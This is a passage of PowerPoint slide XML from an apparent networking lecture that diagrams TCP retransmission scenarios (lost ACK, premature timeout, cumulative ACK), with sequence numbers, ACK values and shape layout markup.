          <p:cNvSpPr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A7315E5E-B3CD-4BDD-8B99-32D4AFBB7544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19</a:t>
            </a:fld>
            <a:endParaRPr lang="nl-NL" sz="10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extShape 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="393840" y="4492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cap="all" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>TCP </a:t>
            </a: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retransmission scenarios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Shape 2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14AB902-41AB-4C31-A849-33CF688664A8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20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647" name="Picture 82" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="384120" y="1281240"/>
            <a:ext cx="5781240" cy="172800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="648" name="CustomShape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1062720" y="6184800"/>
            <a:ext cx="21686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lost ACK scenario</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1800" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="649" name="Line 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="968040" y="4422600"/>
            <a:ext cx="2351160" cy="5065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0" name="Line 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="981000" y="2654280"/>
            <a:ext cx="2346120" cy="5713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1" name="Line 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2017440" y="3315960"/>
            <a:ext cx="1273320" cy="4273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2" name="CustomShape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2884320" y="149544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B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653" name="CustomShape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="552240" y="151272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A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654" name="CustomShape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1684440" y="2735280"/>
            <a:ext cx="869760" cy="40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5" name="CustomShape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="993240" y="2787480"/>
            <a:ext cx="23497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Seq=92, 8 bytes of data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56" name="CustomShape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2252520" y="3402000"/>
            <a:ext cx="747360" cy="245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7" name="CustomShape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2174040" y="3357720"/>
            <a:ext cx="9475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ACK=100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58" name="Line 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="2412720"/>
            <a:ext cx="0" cy="35258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9" name="Line 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3387600" y="2408040"/>
            <a:ext cx="0" cy="35384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0" name="CustomShape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1577880" y="4416480"/>
            <a:ext cx="988560" cy="42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1" name="CustomShape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="982440" y="4497480"/>
            <a:ext cx="23497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Seq=92, 8 bytes of data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62" name="CustomShape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1797840" y="3548160"/>
            <a:ext cx="3762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0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>X</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="663" name="CustomShape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="587880" y="3202200"/>
            <a:ext cx="396360" cy="68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timeout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64" name="Line 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="957240" y="5014800"/>
            <a:ext cx="2338200" cy="78264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5" name="CustomShape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1790640" y="5272200"/>
            <a:ext cx="747360" cy="245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6" name="CustomShape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1712160" y="5227560"/>
            <a:ext cx="9475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ACK=100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667" name="Group 22"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5554440" y="2684160"/>
            <a:ext cx="0" cy="507960"/>
            <a:chOff x="5554440" y="2684160"/>
            <a:chExt cx="0" cy="507960"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="668" name="Line 23"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="5554440" y="2684160"/>
              <a:ext cx="0" cy="50796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9" name="Freeform 24"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5554440" y="2689200"/>
              <a:ext cx="360" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/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60">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="670" name="Group 25"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5565600" y="3890880"/>
            <a:ext cx="0" cy="507960"/>
            <a:chOff x="5565600" y="3890880"/>
            <a:chExt cx="0" cy="507960"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="671" name="Line 26"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5565600" y="3890880"/>
              <a:ext cx="0" cy="50796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2" name="Freeform 27"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5565600" y="4394160"/>
              <a:ext cx="360" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/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60">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="673" name="CustomShape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5712840" y="6191280"/>
            <a:ext cx="23436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premature timeout</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1800" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="674" name="Line 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5684760" y="4429080"/>
            <a:ext cx="2441520" cy="6649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5" name="Line 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5717880" y="2660400"/>
            <a:ext cx="2346480" cy="57168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6" name="Line 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5692680" y="3322440"/>
            <a:ext cx="2334960" cy="158904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7" name="CustomShape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7621560" y="150192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B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678" name="CustomShape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5289480" y="151920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A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679" name="CustomShape 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6421320" y="2741760"/>
            <a:ext cx="869760" cy="40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0" name="CustomShape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5730480" y="2793960"/>
            <a:ext cx="23497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Seq=92, 8 bytes of data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681" name="Group 36"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6595200" y="3814920"/>
            <a:ext cx="947520" cy="303480"/>
            <a:chOff x="6595200" y="3814920"/>
            <a:chExt cx="947520" cy="303480"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="682" name="CustomShape 37"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6673680" y="3848040"/>
              <a:ext cx="747360" cy="24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3" name="CustomShape 38"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6595200" y="3814920"/>
              <a:ext cx="9475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ACK=100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684" name="Line 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5697360" y="2419200"/>
            <a:ext cx="0" cy="35258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5" name="Line 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8102520" y="2414520"/>
            <a:ext cx="0" cy="35384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6" name="CustomShape 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6710400" y="4546440"/>
            <a:ext cx="1056960" cy="50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7" name="CustomShape 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6558480" y="4579920"/>
            <a:ext cx="135756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Seq=92,  8</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1"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bytes of data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88" name="CustomShape 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="5325120" y="3208680"/>
            <a:ext cx="396360" cy="688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rot="5400000" vert="vert" wrap="none"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timeout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689" name="Line 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5716440" y="5132160"/>
            <a:ext cx="2338200" cy="78264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0" name="CustomShape 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6550200" y="5389560"/>
            <a:ext cx="747360" cy="245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1" name="CustomShape 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6471360" y="5345280"/>
            <a:ext cx="9475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ACK=120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692" name="Group 47"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="795240" y="2665080"/>
            <a:ext cx="0" cy="508320"/>
            <a:chOff x="795240" y="2665080"/>
            <a:chExt cx="0" cy="508320"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="693" name="Line 48"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="795240" y="2665080"/>
              <a:ext cx="0" cy="50832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4" name="Freeform 49"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="795240" y="2670120"/>
              <a:ext cx="360" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/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60">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="695" name="Group 50"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="792000" y="3921120"/>
            <a:ext cx="0" cy="507960"/>
            <a:chOff x="792000" y="3921120"/>
            <a:chExt cx="0" cy="507960"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="696" name="Line 51"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="792000" y="3921120"/>
              <a:ext cx="0" cy="50796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7" name="Freeform 52"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="792000" y="4424040"/>
              <a:ext cx="360" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/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360">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="698" name="Group 53"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5605920" y="3046320"/>
            <a:ext cx="2575440" cy="571320"/>
            <a:chOff x="5605920" y="3046320"/>
            <a:chExt cx="2575440" cy="571320"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="699" name="Line 54"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5703840" y="3046320"/>
              <a:ext cx="2346120" cy="57132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0" name="CustomShape 55"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6407280" y="3127320"/>
              <a:ext cx="869760" cy="401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1" name="CustomShape 56"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5605920" y="3179880"/>
              <a:ext cx="25754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Seq=100, 20 bytes of data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702" name="Line 57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5697360" y="3678120"/>
            <a:ext cx="2335320" cy="158904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03" name="Group 58"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6834960" y="4091040"/>
            <a:ext cx="947520" cy="303480"/>
            <a:chOff x="6834960" y="4091040"/>
            <a:chExt cx="947520" cy="303480"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="704" name="CustomShape 59"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6913440" y="4124160"/>
              <a:ext cx="747360" cy="24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5" name="CustomShape 60"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6834960" y="4091040"/>
              <a:ext cx="9475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ACK=120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706" name="CustomShape 61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4237560" y="4734000"/>
            <a:ext cx="154980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SendBase=100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707" name="CustomShape 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4256640" y="5075280"/>
            <a:ext cx="154980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SendBase=120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708" name="CustomShape 63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4275720" y="5749920"/>
            <a:ext cx="154980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SendBase=120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709" name="CustomShape 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4310640" y="2505240"/>
            <a:ext cx="1437120" cy="303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SendBase=92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710" name="Group 65"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5275440" y="1781280"/>
            <a:ext cx="630000" cy="533160"/>
            <a:chOff x="5275440" y="1781280"/>
            <a:chExt cx="630000" cy="533160"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="711" name="Picture 220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5275440" y="1781280"/>
              <a:ext cx="630000" cy="533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12" name="CustomShape 66"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="5543640" y="1832400"/>
              <a:ext cx="306000" cy="24372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3" name="Group 67"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7842240" y="1787400"/>
            <a:ext cx="631440" cy="622080"/>
            <a:chOff x="7842240" y="1787400"/>
            <a:chExt cx="631440" cy="622080"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="714" name="Picture 226" descr="desktop_computer_stylized_medium"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="7842240" y="1787400"/>
              <a:ext cx="631440" cy="622080"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln>
              <a:noFill/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="715" name="CustomShape 68"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7897680" y="1847160"/>
              <a:ext cx="306720" cy="28476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6" name="Group 69"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="551160" y="1785960"/>
            <a:ext cx="630000" cy="533160"/>
            <a:chOff x="551160" y="1785960"/>
            <a:chExt cx="630000" cy="533160"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="717" name="Picture 229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551160" y="1785960"/>
              <a:ext cx="630000" cy="533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18" name="CustomShape 70"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="819360" y="1837080"/>
              <a:ext cx="306000" cy="24372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19" name="Group 71"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3129120" y="1770120"/>
            <a:ext cx="709200" cy="599760"/>
            <a:chOff x="3129120" y="1770120"/>
            <a:chExt cx="709200" cy="599760"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="720" name="Picture 232" descr="desktop_computer_stylized_medium"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="3129120" y="1770120"/>
              <a:ext cx="709200" cy="5997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21" name="CustomShape 72"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3191040" y="1827720"/>
              <a:ext cx="344520" cy="27432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722" name="CustomShape 73"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7543800" y="658008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5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Shape 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="393840" y="5414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cap="all" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>TCP </a:t>
            </a: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retransmission scenarios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Shape 2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510C546-E59F-4DBC-84F6-6CD0220F0F9E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21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725" name="Picture 82" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="384120" y="1382760"/>
            <a:ext cx="5781240" cy="172800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="726" name="CustomShape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1520280" y="3747960"/>
            <a:ext cx="37620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0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>X</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="727" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="986040" y="5929200"/>
            <a:ext cx="19857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cumulative ACK</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1800" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="728" name="Line 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="938160" y="4819320"/>
            <a:ext cx="2441520" cy="66528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9" name="Line 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2724120"/>
            <a:ext cx="2346120" cy="5713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0" name="Line 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1792080" y="3385800"/>
            <a:ext cx="1432080" cy="57312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1" name="CustomShape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805120" y="155268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B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732" name="CustomShape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="485640" y="1582560"/>
            <a:ext cx="8427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Host A</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1600" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="733" name="CustomShape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1617840" y="2805120"/>
            <a:ext cx="869760" cy="40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4" name="CustomShape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="926640" y="2857680"/>
            <a:ext cx="23497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Seq=92, 8 bytes of data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735" name="Group 12"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1815120" y="3586320"/>
            <a:ext cx="947520" cy="303480"/>
            <a:chOff x="1815120" y="3586320"/>
            <a:chExt cx="947520" cy="303480"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="736" name="CustomShape 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1893960" y="3619440"/>
              <a:ext cx="747360" cy="24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7" name="CustomShape 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1815120" y="3586320"/>
              <a:ext cx="9475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ACK=100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738" name="Line 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="893520" y="2482560"/>
            <a:ext cx="0" cy="35258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9" name="Line 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3298680" y="2477880"/>
            <a:ext cx="0" cy="3538440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9360">
            <a:solidFill>
              <a:schemeClr val="bg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0" name="CustomShape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1635120" y="4892760"/>
            <a:ext cx="933120" cy="50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1" name="CustomShape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="909720" y="4979880"/>
            <a:ext cx="265248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Tahoma"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>Seq=120,  15 bytes of data</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="742" name="Group 19"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="519480" y="2728800"/>
            <a:ext cx="396360" cy="2403360"/>
            <a:chOff x="519480" y="2728800"/>
            <a:chExt cx="396360" cy="2403360"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="743" name="CustomShape 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="519480" y="3606120"/>
              <a:ext cx="396360" cy="688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rot="5400000" vert="vert" wrap="none"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timeout</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="744" name="Group 21"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="661680" y="2728800"/>
